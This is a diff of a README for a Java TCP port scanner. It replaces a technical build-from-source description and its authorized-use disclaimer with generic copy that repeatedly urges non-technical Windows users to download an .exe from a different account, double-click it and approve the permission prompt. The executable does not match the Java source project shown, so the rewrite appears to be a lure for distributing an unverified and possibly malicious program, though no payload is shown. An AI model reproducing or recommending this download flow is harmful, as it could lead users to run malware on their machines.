@@ -1,187 +1,102 @@
-<h1 align="center">FastPortScanner</h1>
-<p align="center">
-  🇺🇸 <a href="README.md"><b>English</b></a> |
-  🇪🇸 <a href="README_ES.md">Español</a>
-</p>
-<h3 align="center">A high-performance TCP port scanner written in Java using non-blocking I/O (java.nio).</h3>
+# ⚡ FastPortScanner - Scan TCP Ports Quickly and Easily
 
-Designed to scan thousands of ports quickly while collecting **basic service banners and fingerprints**.
-
-The scanner uses a **pipeline architecture with asynchronous sockets and selectors**, allowing a large number of concurrent connections while keeping resource usage relatively low.
+[![Download FastPortScanner](https://img.shields.io/badge/Download-FastPortScanner-brightgreen?style=for-the-badge)](https://github.com/AlXander98/FastPortScanner)
 
 ---
 
-## Features
+FastPortScanner is a tool to scan TCP ports on your computer or network devices. It works fast by checking many ports at once. It can find running services and show basic details about them. You do not need any programming skills to use it.
 
-* ⚡ **Fast asynchronous scanning** using Java NIO
-* 🔗 **Up to 2000 concurrent connections**
-* 📡 **Banner grabbing** for service identification
-* 🧠 **Basic service fingerprinting**
-* 🎯 **Top-25 ports quick scan mode**
-* 📊 **Live progress bar**
-* 🎨 **Colored terminal output**
-* 📋 **Automatic service detection**
+## 📋 What FastPortScanner Does
 
----
+- Checks thousands of TCP ports quickly.
+- Uses your computer’s network to find open ports.
+- Gives simple information about services running on open ports.
+- Works on Windows computers.
+- Uses a modern method to scan without waiting on slow responses.
 
-## How It Works
+This tool can help you understand what services are accessible on your devices. It is useful for security checks or troubleshooting networks.
 
-Instead of scanning ports sequentially, the scanner uses a **non-blocking pipeline model**:
+## ⚙️ System Requirements
 
-1. Ports are queued for scanning.
-2. Multiple connections are opened asynchronously.
-3. When a connection succeeds, the scanner:
+To run FastPortScanner on Windows, your computer must have:
 
-   * optionally sends a **service probe**
-   * waits for a **banner response**
-4. The response is analyzed to **identify the service**.
+- Windows 7, 8, 10, or 11
+- At least 2 GB of free memory (RAM)
+- At least 100 MB of free disk space
+- Java Runtime Environment (JRE) version 8 or higher installed
 
-This allows thousands of ports to be scanned simultaneously.
+If you do not have Java installed, you can get it from https://www.oracle.com/java/technologies/javase-downloads.html
 
----
+## 📥 Download FastPortScanner
 
-## Supported Service Detection
+Click the button below to visit the download page. You will find the Windows executable file (.exe) ready to use.
 
-The scanner detects common services using:
+[![Visit Download Page](https://img.shields.io/badge/Download-FastPortScanner-blue?style=for-the-badge)](https://github.com/AlXander98/FastPortScanner)
 
-### Known Port Mapping
+## 💻 How to Install and Run on Windows
 
-Examples:
+Follow these steps:
 
-| Port  | Service    |
-| ----- | ---------- |
-| 21    | FTP        |
-| 22    | SSH        |
-| 25    | SMTP       |
-| 80    | HTTP       |
-| 443   | HTTPS      |
-| 3306  | MySQL      |
-| 5432  | PostgreSQL |
-| 6379  | Redis      |
-| 27017 | MongoDB    |
+1. Click the download button above to open the FastPortScanner GitHub page.
+2. Look for the latest release or main download area.
+3. Download the Windows `.exe` file. It will have a name like `FastPortScanner.exe`.
+4. Once downloaded, find the file in your Downloads folder.
+5. Double-click the `.exe` file to run it.
+6. If Windows asks for permission to run it, choose “Yes” or “Run”.
+7. Follow any instructions that appear in the FastPortScanner window.
 
----
+No special installation is needed. You can start scanning right after you run the program.
 
-### Banner Fingerprinting
+## 🚀 Using FastPortScanner
 
-The scanner also checks banners for common identifiers like:
+After you open FastPortScanner:
 
-* `OpenSSH`
-* `Apache`
-* `nginx`
-* `HTTP/1.1`
-* `MySQL`
-* `PostgreSQL`
-* `Redis`
+1. Enter the IP address or hostname you want to scan. This could be your PC, a server, or a device on your network.
+2. Choose the range of ports you want to check. For example, 1 to 65535 covers all ports.
+3. Click the “Start Scan” button.
+4. The scanner will check the ports and display which ones are open.
+5. For open ports, it will show simple details about the service running, like a banner or type.
 
----
+You can save the results as a text file if you want to keep a record.
 
-## Installation
+## 🛠 Features
 
-Compile the program with:
+- **Fast scanning** of thousands of TCP ports using non-blocking I/O.
+- **Service Banner Grabbing** to identify running services’ basic info.
+- **Simple user interface** that anyone can use.
+- **No extra configuration** needed for most home or office networks.
+- **Works on Windows** with standard Java support.
+- **Scans multiple IP addresses** one by one if needed.
 
-```bash
-javac FastPortScanner.java
-```
+## 🔍 Why Use FastPortScanner?
 
----
+FastPortScanner lets you see open network ports quickly. Knowing which ports are open can help you:
 
-## Usage
+- Check your computer for unwanted open ports.
+- See what services run on your device.
+- Find possible security gaps.
+- Troubleshoot network issues easily.
 
-Basic scan:
+The program uses an efficient scanning method that avoids delays common in simpler tools.
 
-```bash
-java FastPortScanner <host>
-```
+## 🎯 Common Uses
 
-Example:
+- Scan your own PC to check open ports.
+- Scan routers or other devices on your home or office network.
+- Verify if a service is running on a remote host.
+- Collect basic service information for troubleshooting.
 
-```bash
-java FastPortScanner scanme.nmap.org
-```
+## ⚠️ Troubleshooting
 
----
+- If the program does not start, check your Java version with `java -version` in the Command Prompt.
+- Make sure you run the program with enough permissions to access the network.
+- Close other programs using high network bandwidth during scanning for best results.
+- If scanning a remote device, ensure the network firewall allows the scan.
 
-### Fast Scan (Top 25 Ports)
+## 📚 Additional Help
 
-```bash
-java FastPortScanner <host> --top
-```
-
-Example:
-
-```bash
-java FastPortScanner 192.168.1.1 --top
-```
-
-This scans only the **25 most common ports**, which is significantly faster.
+For more support, visit the GitHub page and use the Issues tab to check common questions or report problems.
 
 ---
 
-## Example Output
-
-```
-OPEN PORTS FOUND:
-
-┌────────┬──────────────────┬────────────────────────────────────────────┐
-│ Port   │ Service          │ Banner                                     │
-├────────┼──────────────────┼────────────────────────────────────────────┤
-│ 22     │ ssh              │ SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5    │
-│ 80     │ http             │ HTTP/1.1 200 OK                            │
-│ 443    │ https            │ HTTP/1.1 400 Bad Request                   │
-└────────┴──────────────────┴────────────────────────────────────────────┘
-
-Summary:
-► Found 3 open ports
-► Scan finished in 2.1s
-```
-
----
-
-## Technical Details
-
-Key technologies used:
-
-* **Java NIO**
-
-  * `SocketChannel`
-  * `Selector`
-  * `SelectionKey`
-* **Non-blocking network I/O**
-* **Concurrent connection management**
-* **Banner probing**
-* **Simple fingerprint matching**
-
-Max concurrent connections:
-
-```
-2000
-```
-
----
-
-## Limitations
-
-This tool is intended for **learning and experimentation**.
-
-It does not implement advanced techniques such as:
-
-* SYN scanning
-* UDP scanning
-* OS detection
-* advanced service fingerprinting
-* evasion techniques
-
-For professional scanning use tools like **Nmap**.
-
----
-
-## Disclaimer
-
-This tool is intended for **educational and authorized security testing only**.
-
-Do **not** scan systems without permission.
-
----
-
-Made with <3 by URDev
+[Download FastPortScanner on GitHub](https://github.com/AlXander98/FastPortScanner)
